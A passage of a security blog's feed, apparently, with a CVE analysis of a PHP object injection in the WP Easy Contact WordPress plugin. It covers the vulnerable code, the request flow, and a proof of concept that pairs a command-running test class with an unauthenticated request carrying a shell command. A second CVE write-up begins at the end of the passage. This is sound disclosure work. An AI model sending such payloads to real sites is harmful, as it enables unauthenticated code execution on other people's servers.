class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;nv&#34;&gt;$pageno&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pageno&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pageno&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;nv&#34;&gt;$div_id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;div_id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;div_id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;nv&#34;&gt;$myapp&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;app&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;app&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$div_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$pids&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;Array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$front_ents&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;emd_find_limitby&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;frontend&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$myapp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$widg_arr&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$div_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$mywidg&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$widg_arr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For the line &lt;code&gt;new&amp;ensp;$widg_arr[1]()&lt;/code&gt; to run, the condition &lt;code&gt;if(!empty($div_id))&lt;/code&gt; must be satisfied, meaning the GET parameter &lt;code&gt;div_id&lt;/code&gt; has to be provided.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$widg_arr[1]&lt;/code&gt; is taken from the array obtained after &lt;code&gt;explode&lt;/code&gt; on the value of &lt;code&gt;$_GET[&#39;div_id&#39;]&lt;/code&gt;.&#xA;For example, if &lt;code&gt;div_id=abc-Class&lt;/code&gt;, then &lt;code&gt;$widg_arr[1]&lt;/code&gt; equals &lt;code&gt;Class&lt;/code&gt;, allowing arbitrary object instantiation through &lt;code&gt;new&amp;ensp;$widg_arr[1]()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;A[&#34;Client&amp;ensp;sends&amp;ensp;GET&amp;ensp;/wp-admin/admin-ajax.php?action=emd_get_widg_pagenum&amp;div_id=abc-Class&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;WordPress&amp;ensp;hook:&amp;ensp;wp_ajax_nopriv_emd_get_widg_pagenum&#34;]&#xD;&#xA;&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;Callback:&amp;ensp;emd_get_widg_pagenum()&#34;]&#xD;&#xA;&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D{&#34;Check&amp;ensp;if&amp;ensp;div_id&amp;ensp;is&amp;ensp;not&amp;ensp;empty&#34;}&#xD;&#xA;D&amp;ensp;--&amp;ensp;True&amp;ensp;--&gt;&amp;ensp;E[&#34;explode(&#39;-&#39;,&amp;ensp;div_id)&amp;ensp;→&amp;ensp;$widg_arr&#34;]&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;Instantiate&amp;ensp;object:&amp;ensp;new&amp;ensp;$widg_arr[1]()&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a test class inside &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;ObjectInjection&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Send the request with payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;GET&amp;ensp;/wp-admin/admin-ajax.php?action=emd_get_widg_pagenum&amp;amp;div_id=abc-ObjectInjection&amp;amp;cmd=ls+/&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-18-cve-2025-53572/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-18-cve-2025-53572/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-18-cve-2025-53572/result.png&#39; alt=&#34;Result&#34; height=&#34;787&#34; width=&#34;1477&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;p&gt;The vulnerability in &lt;strong&gt;WP Easy Contact &amp;lt;= 4.0.1&lt;/strong&gt; stems from unsafe input handling, allowing direct object instantiation from user-controlled data. By abusing the &lt;code&gt;div_id&lt;/code&gt; parameter, attackers can achieve &lt;strong&gt;PHP Object Injection&lt;/strong&gt; leading to arbitrary code execution. The patch in &lt;strong&gt;4.0.2&lt;/strong&gt; fixes the issue by introducing a whitelist and sanitizing input, ensuring only valid classes can be instantiated. This clearly demonstrates how unsafe deserialization can become a critical exploit vector, especially when combined with unauthenticated access.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Unauthenticated attack surface&lt;/strong&gt;: Triggered via &lt;code&gt;wp_ajax_nopriv&lt;/code&gt;, no login required.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Root cause&lt;/strong&gt;: Directly using user input (&lt;code&gt;new&amp;ensp;$widg_arr[1]()&lt;/code&gt;), no validation.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Fix strategy&lt;/strong&gt;: Apply &lt;strong&gt;whitelist&lt;/strong&gt; and &lt;strong&gt;sanitize&lt;/strong&gt; to restrict valid classes.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Best practice&lt;/strong&gt;: Always validate and sanitize input, avoid unsafe deserialization, and restrict object instantiation from untrusted sources.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-easy-contact/vulnerability/wordpress-wp-easy-contact-plugin-4-0-1-php-object-injection-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Easy Contact Plugin &amp;lt;= 4.0.1 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-49401 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-17-cve-2025-49401/</link>
      <pubDate>Mon, 17 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-17-cve-2025-49401/</guid>
      <category domain="http://localhost:1313/categories/cve-analyst/">CVE Analyst</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/app.gif&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;This plugin performs &lt;strong&gt;unserialize&lt;/strong&gt; on user-supplied data through a form field, which may allow &lt;strong&gt;unauthenticated users&lt;/strong&gt; to perform &lt;strong&gt;PHP Object Injection&lt;/strong&gt; if a suitable gadget exists in the system.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-49401&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-49401&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 10.2.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 10.2.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/quiz-master-next/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Quiz And Survey Master Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 